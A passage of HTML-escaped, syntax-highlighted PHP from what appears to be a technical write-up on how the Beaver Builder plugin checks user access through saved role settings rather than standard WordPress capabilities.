class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_saved_settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Return&amp;ensp;false&amp;ensp;if&amp;ensp;no&amp;ensp;settings&amp;ensp;saved.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Make&amp;ensp;sure&amp;ensp;super&amp;ensp;admins&amp;ensp;have&amp;ensp;administrator&amp;ensp;access.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_multisite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_super_admin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;roles&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;the&amp;ensp;user&amp;#39;s&amp;ensp;roles&amp;ensp;against&amp;ensp;the&amp;ensp;saved&amp;ensp;settings.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;roles&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Return&amp;ensp;true&amp;ensp;if&amp;ensp;the&amp;ensp;user&amp;ensp;has&amp;ensp;access.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;current_user_can&lt;/code&gt; checks permissions based on &lt;strong&gt;role + plugin settings&lt;/strong&gt;, not WordPress&amp;rsquo;s standard capabilities. It calls &lt;code&gt;self::get_saved_settings()&lt;/code&gt; to fetch settings:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;get_saved_settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$roles&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_all_roles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;FLBuilderModel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_admin_settings_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_user_access&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ms_settings&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;FLBuilderModel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_admin_settings_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_fl_builder_user_access&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ms_support&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;FLBuilderAdminSettings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;multisite_support&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$registered_settings&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ms_support&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ms_settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ms_settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$roles&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$role_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span 